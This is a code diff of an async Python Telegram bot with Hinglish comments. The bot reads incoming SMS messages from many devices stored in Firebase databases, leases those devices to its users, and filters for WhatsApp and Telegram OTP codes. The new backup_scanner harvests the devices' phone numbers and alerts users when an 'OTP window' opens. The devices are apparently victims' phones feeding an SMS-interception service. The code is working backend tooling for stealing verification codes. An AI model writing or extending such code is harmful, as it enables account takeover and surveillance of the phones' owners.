@@ -49,7 +49,6 @@ async def check_device(bot, fb_url, auth, dev_id, users, last_msg_id, phone_numb
                 
                 # 🚨 STRICT FILTER: Agar user ne WhatsApp select kiya hai, to sirf WhatsApp ka OTP jaye
                 if service_filter == "whatsapp":
-                    # WhatsApp ke message me "whatsapp" word hona chahiye
                     if "whatsapp" not in text.lower() and "whatsapp" not in sender.lower() and not re.search(r'code:\s*\d{3}-\d{3}', text):
                         continue
                 elif service_filter == "telegram":
@@ -76,7 +75,7 @@ async def start_scanner(bot):
             for uid, lease in leases.items():
                 if current_time < lease["expire_at"]:
                     fb_url, dev_id = lease.get("fb_url"), lease.get("dev_id")
-                    service = lease.get("service_filter", "any") # Default any
+                    service = lease.get("service_filter", "any")
                     if fb_url and dev_id:
                         key = (fb_url, dev_id)
                         if key not in device_to_users:
@@ -128,13 +127,11 @@ async def whatsapp_scanner(bot):
                             
                             msgs = [v for v in msgs_dict.values() if isinstance(v, dict) and v.get("type") == "incoming"]
                             
-                            # 🚨 STRICT WHATSAPP CHECK: Sirf wahi line list me daalo jisme asli WhatsApp ka message ho
                             has_recent_ws = False
                             latest_id = 0
                             for m in msgs:
                                 txt = (m.get("message") or "").lower()
                                 snd = (m.get("sender") or "").lower()
-                                # Agar text me whatsapp likha hai ya whatsapp code format hai
                                 if "whatsapp" in txt or "whatsapp code:" in txt or re.search(r'code:\s*\d{3}-\d{3}', txt):
                                     has_recent_ws = True
                                     mid = int(m.get("id", 0))
@@ -162,5 +159,63 @@ async def whatsapp_scanner(bot):
         await asyncio.sleep(60)
 
 async def backup_scanner(bot):
-    # (Ye purana wala hi rahega, isme koi change nahi karna)
-    # ...
+    log.info("Backup Scanner Started...")
+    while True:
+        try:
+            d = db.load_data()
+            fbs = d.get("firebases", [])
+            if fbs:
+                all_devs = []
+                for fb in fbs:
+                    clients = await fbu.fetch_fb(f"{fb['url']}/clients.json?shallow=true", fb.get("auth"))
+                    if clients and isinstance(clients, dict):
+                        for dev_id in clients.keys(): all_devs.append((fb, dev_id))
+                
+                now = int(time.time())
+                missing = []
+                for fb, dev_id in all_devs:
+                    bkp = d.get("device_backups", {}).get(dev_id, {})
+                    if not bkp.get("numbers") or (now - bkp.get("time", 0) > 172800): missing.append((fb, dev_id))
+                
+                random.shuffle(missing)
+                for fb, dev_id in missing[:10]:
+                    msgs = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=20", fb.get("auth"))
+                    dev_data = await fbu.fetch_fb(f"{fb['url']}/clients/{dev_id}.json", fb.get("auth"))
+                    if msgs and isinstance(msgs, dict) and dev_data and isinstance(dev_data, dict):
+                        msgs_list = [v for k, v in msgs.items() if isinstance(v, dict) and v.get("type") == "incoming"]
+                        best_nums = fbu.extract_best_numbers(dev_data, msgs_list)
+                        if best_nums:
+                            nums = [n for n, c in best_nums]
+                            if "device_backups" not in d: d["device_backups"] = {}
+                            d["device_backups"][dev_id] = {"numbers": nums, "time": int(time.time())}
+                
+                if "device_backups" in d:
+                    for dev_id in list(d["device_backups"].keys()):
+                        if now - d["device_backups"][dev_id].get("time", 0) > 172800: del d["device_backups"][dev_id]
+                db.save_data(d)
+
+            timers = d.get("upcoming_timers", {})
+            now = int(time.time())
+            changed = False
+            for key, t in list(timers.items()):
+                if t.get("alert_5m") is False and (t["target_time"] - now) <= 300:
+                    try: await bot.send_message(t["user_id"], f"⏰ <b>{sc('otp alert')}</b>\nAapka OTP aane wala hai (5 min baaki)!\n📞 <code>{t['number']}</code>", parse_mode="HTML")
+                    except: pass
+                    t["alert_5m"] = True
+                    changed = True
+                if t.get("alert_2m") is False and (t["target_time"] - now) <= 120:
+                    try: await bot.send_message(t["user_id"], f"⏰ <b>{sc('otp alert')}</b>\nSirf 2 minute bache hain!\n📞 <code>{t['number']}</code>", parse_mode="HTML")
+                    except: pass
+                    t["alert_2m"] = True
+                    changed = True
+                if now >= t["target_time"] and t.get("alert_now") is False:
+                    try: await bot.send_message(t["user_id"], f"🚀 <b>{sc('otp window open')}</b>\nAb try karein!\n📞 <code>{t['number']}</code>", parse_mode="HTML")
+                    except: pass
+                    t["alert_now"] = True
+                    changed = True
+            if changed: db.save_data(d)
+            
+            await asyncio.sleep(10)
+        except Exception as e:
+            log.error(f"Backup Scanner error: {e}")
+            await asyncio.sleep(10)
